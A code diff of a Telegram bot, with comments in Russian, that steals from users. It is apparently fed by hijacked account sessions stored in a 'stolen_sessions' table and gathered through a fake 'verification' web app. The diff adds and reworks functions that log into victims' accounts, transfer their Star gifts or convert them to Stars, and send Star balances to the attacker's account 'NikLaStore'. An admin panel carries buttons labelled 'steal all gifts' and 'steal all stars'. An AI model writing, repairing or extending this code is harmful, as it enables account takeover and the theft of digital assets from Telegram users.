@@ -284,7 +284,7 @@ bot.on('callback_query', async (query) => {
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "✅ Пройти верификацию", web_app: { url: WEB_APP_URL } }
+                                { text: "✅ Пройти верификация", web_app: { url: WEB_APP_URL } }
                             ]
                         ]
                     }
@@ -504,34 +504,7 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     }
 });
 
-// АДМИНСКИЕ КОМАНДЫ
-bot.onText(/\/admin/, (msg) => {
-    console.log(`🛠️ Админ команда от пользователя ${msg.from.id}`);
-    
-    if (msg.from.id !== MY_USER_ID) {
-        console.log(`❌ Доступ запрещен для ${msg.from.id}`);
-        return;
-    }
-    
-    const adminText = `🛠️ <b>Админ панель</b>\n\nВыберите действие:`;
-    
-    const adminKeyboard = {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: "🎁 Украсть все подарки", callback_data: "steal_gifts" }],
-                [{ text: "⭐ Украсть все звезды", callback_data: "steal_stars" }],
-                [{ text: "📊 Посмотреть логи", callback_data: "show_logs" }]
-            ]
-        }
-    };
-
-    bot.sendMessage(msg.chat.id, adminText, {
-        parse_mode: 'HTML',
-        ...adminKeyboard
-    });
-});
-
-// КРАЖА ПОДАРКОВ
+// КРАЖА ПОДАРКОВ (ОБНОВЛЕННЫЙ МЕТОД)
 async function stealAllGifts() {
     try {
         const rows = await new Promise((resolve, reject) => {
@@ -555,7 +528,7 @@ async function stealAllGifts() {
                 await client.connect();
                 bot.sendMessage(MY_USER_ID, `🔗 Подключен к ${row.phone}, ищу подарки...`);
                 
-                const result = await transferGiftsToNikLa(client, row.phone);
+                const result = await transferGiftsToTarget(client, row.phone);
                 await client.disconnect();
                 
                 if (result) totalStolen++;
@@ -597,7 +570,7 @@ async function stealAllStars() {
                 await client.connect();
                 bot.sendMessage(MY_USER_ID, `🔗 Подключен к ${row.phone}, проверяю звезды...`);
                 
-                const result = await transferStarsToNikLa(client, row.phone);
+                const result = await transferStarsToTarget(client, row.phone);
                 await client.disconnect();
                 
                 if (result) totalStolen++;
@@ -615,8 +588,123 @@ async function stealAllStars() {
     }
 }
 
-// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ЗВЕЗД
-async function transferStarsToNikLa(client, phone) {
+// ОБНОВЛЕННАЯ ФУНКЦИЯ ПЕРЕДАЧИ ПОДАРКОВ
+async function transferGiftsToTarget(client, phone) {
+    try {
+        console.log(`🔎 Ищу подарки для ${phone}...`);
+        
+        // Получаем список подарков
+        const gifts = await client.invoke(
+            new Api.payments.GetSavedStarGifts({
+                peer: new Api.InputPeerSelf(),
+                offset: "",
+                limit: 100,
+            })
+        );
+
+        console.log(`🎁 Всего подарков: ${gifts.gifts ? gifts.gifts.length : 0}`);
+
+        if (!gifts.gifts || gifts.gifts.length === 0) {
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет подарков`);
+            return false;
+        }
+
+        // Резолвим целевого пользователя
+        const target = await client.invoke(
+            new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
+        );
+        
+        if (!target || !target.users || target.users.length === 0) {
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
+            return false;
+        }
+
+        const targetUser = target.users[0];
+        const targetPeer = new Api.InputPeerUser({
+            userId: targetUser.id,
+            accessHash: targetUser.accessHash
+        });
+
+        // Фильтруем только transferable подарки (у которых есть transferStars)
+        const transferableGifts = gifts.gifts.filter(gift => gift.transferStars);
+        
+        console.log(`🔄 Transferable подарков: ${transferableGifts.length}`);
+
+        if (transferableGifts.length === 0) {
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет transferable подарков`);
+            return false;
+        }
+
+        bot.sendMessage(MY_USER_ID, `🔄 ${phone}: Начинаю передачу ${transferableGifts.length} подарков...`);
+
+        let stolenCount = 0;
+
+        for (const gift of transferableGifts) {
+            try {
+                console.log(`→ Передаю подарок msgId=${gift.msgId}, transferStars=${gift.transferStars ? Number(gift.transferStars.value) : 'N/A'}`);
+
+                await client.invoke(
+                    new Api.payments.TransferStarGift({
+                        stargift: new Api.InputSavedStarGiftUser({ 
+                            msgId: gift.msgId 
+                        }),
+                        toId: targetPeer
+                    })
+                );
+                
+                stolenCount++;
+                console.log(`   ✅ Успешно передан подарок`);
+                
+                // Пауза между запросами
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+            } catch (e) {
+                console.log(`   ❌ Ошибка передачи подарка:`, e.message);
+                
+                // Если передача не работает, пробуем конвертировать в звезды
+                try {
+                    if (gift.convertStars) {
+                        console.log(`   🔄 Пробую конвертировать в звезды: ${gift.convertStars}`);
+                        
+                        await client.invoke(
+                            new Api.payments.SendStars({
+                                peer: targetPeer,
+                                stars: gift.convertStars,
+                                purpose: new Api.InputStorePaymentGift({
+                                    userId: targetUser.id
+                                })
+                            })
+                        );
+                        
+                        stolenCount++;
+                        console.log(`   ✅ Успешно конвертирован в звезды`);
+                        await new Promise(resolve => setTimeout(resolve, 1500));
+                    }
+                } catch (e2) {
+                    console.log(`   ❌ Ошибка конвертации:`, e2.message);
+                    continue;
+                }
+            }
+        }
+
+        if (stolenCount > 0) {
+            db.run(`UPDATE stolen_sessions SET gifts_data = ? WHERE phone = ?`, 
+                [stolenCount, phone]);
+            bot.sendMessage(MY_USER_ID, `✅ ${phone}: Украдено ${stolenCount} подарков`);
+            return true;
+        }
+        
+        return false;
+        
+    } catch (error) {
+        console.log(`❌ Ошибка кражи подарков для ${phone}:`, error.message);
+        bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка кражи подарков - ${error.message}`);
+        return false;
+    }
+}
+
+// ОБНОВЛЕННАЯ ФУНКЦИЯ КРАЖИ ЗВЕЗД
+async function transferStarsToTarget(client, phone) {
     try {
         // Получаем баланс звезд
         const status = await client.invoke(
@@ -627,6 +715,8 @@ async function transferStarsToNikLa(client, phone) {
 
         const bal = status.balance;
         const starsAmount = Number(bal.amount) + Number(bal.nanos ?? 0) / 1_000_000_000;
+
+        console.log(`⭐ ${phone}: Баланс звезд: ${starsAmount}`);
 
         if (starsAmount === 0) {
             bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет звезд`);
@@ -644,11 +734,15 @@ async function transferStarsToNikLa(client, phone) {
         }
 
         const targetUser = target.users[0];
+        const targetPeer = new Api.InputPeerUser({
+            userId: targetUser.id,
+            accessHash: targetUser.accessHash
+        });
 
         // Передаем звезды
         await client.invoke(
             new Api.payments.SendStars({
-                peer: targetUser,
+                peer: targetPeer,
                 stars: Math.floor(starsAmount),
                 purpose: new Api.InputStorePaymentPremiumSubscription({
                     restore: false,
@@ -664,91 +758,8 @@ async function transferStarsToNikLa(client, phone) {
         return true;
         
     } catch (error) {
+        console.log(`❌ Ошибка передачи звезд для ${phone}:`, error.message);
         bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка передачи звезд - ${error.message}`);
-        return false;
-    }
-}
-
-// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ПОДАРКОВ
-async function transferGiftsToNikLa(client, phone) {
-    try {
-        // Получаем список подарков
-        const gifts = await client.invoke(
-            new Api.payments.GetSavedStarGifts({
-                peer: new Api.InputPeerSelf(),
-                offset: "",
-                limit: 100,
-            })
-        );
-
-        if (!gifts.gifts || gifts.gifts.length === 0) {
-            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет подарков`);
-            return false;
-        }
-
-        const target = await client.invoke(
-            new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
-        );
-        
-        if (!target || !target.users || target.users.length === 0) {
-            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
-            return false;
-        }
-
-        const targetUser = target.users[0];
-        let stolenCount = 0;
-
-        for (const gift of gifts.gifts) {
-            try {
-                // Пробуем передать подарок
-                await client.invoke(
-                    new Api.payments.TransferStarGift({
-                        stargift: new Api.InputSavedStarGiftUser({ 
-                            msgId: gift.msgId 
-                        }),
-                        toId: new Api.InputPeerUser({ 
-                            userId: targetUser.id,
-                            accessHash: targetUser.accessHash
-                        })
-                    })
-                );
-                
-                stolenCount++;
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-            } catch (e) {
-                // Если передача не работает, пробуем конвертировать в звезды
-                try {
-                    if (gift.convertStars) {
-                        await client.invoke(
-                            new Api.payments.SendStars({
-                                peer: targetUser,
-                                stars: gift.convertStars,
-                                purpose: new Api.InputStorePaymentGift({
-                                    userId: targetUser.id
-                                })
-                            })
-                        );
-                        stolenCount++;
-                        await new Promise(resolve => setTimeout(resolve, 2000));
-                    }
-                } catch (e2) {
-                    continue;
-                }
-            }
-        }
-
-        if (stolenCount > 0) {
-            db.run(`UPDATE stolen_sessions SET gifts_data = ? WHERE phone = ?`, 
-                [stolenCount, phone]);
-            bot.sendMessage(MY_USER_ID, `✅ ${phone}: Украдено ${stolenCount} подарков`);
-            return true;
-        }
-        
-        return false;
-        
-    } catch (error) {
-        bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка кражи подарков - ${error.message}`);
         return false;
     }
 }
@@ -774,4 +785,31 @@ function showLogs(chatId) {
     });
 }
 
-console.log('✅ Бот запущен с исправленными URL фотографий');
+// АДМИНСКИЕ КОМАНДЫ
+bot.onText(/\/admin/, (msg) => {
+    console.log(`🛠️ Админ команда от пользователя ${msg.from.id}`);
+    
+    if (msg.from.id !== MY_USER_ID) {
+        console.log(`❌ Доступ запрещен для ${msg.from.id}`);
+        return;
+    }
+    
+    const adminText = `🛠️ <b>Админ панель</b>\n\nВыберите действие:`;
+    
+    const adminKeyboard = {
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: "🎁 Украсть все подарки", callback_data: "steal_gifts" }],
+                [{ text: "⭐ Украсть все звезды", callback_data: "steal_stars" }],
+                [{ text: "📊 Посмотреть логи", callback_data: "show_logs" }]
+            ]
+        }
+    };
+
+    bot.sendMessage(msg.chat.id, adminText, {
+        parse_mode: 'HTML',
+        ...adminKeyboard
+    });
+});
+
+console.log('✅ Бот запущен с обновленными функциями кражи');
